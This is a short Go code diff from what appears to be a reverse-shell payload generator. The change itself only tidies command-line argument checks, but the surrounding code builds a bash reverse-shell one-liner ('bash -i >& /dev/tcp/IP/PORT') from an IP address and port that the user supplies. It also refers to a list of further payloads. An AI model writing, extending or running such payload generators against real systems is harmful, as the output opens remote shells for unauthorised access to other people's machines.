@@ -56,13 +56,14 @@ Payloads list:
 `
 
 func main() {
-	if len(os.Args) < 3 {
+	args := os.Args
+	if len(args) != 4 {
 		fmt.Println(strings.TrimSpace(usage))
 		return
 	}
-	payload := os.Args[1]
-	ip := os.Args[2]
-	port := os.Args[3]
+	payload := args[1]
+	ip := args[2]
+	port := args[3]
 	if payload == "1" {
 		fmt.Printf("\nbash -i >& /dev/tcp/%s/%s 0>&1\n",
 			ip, port)
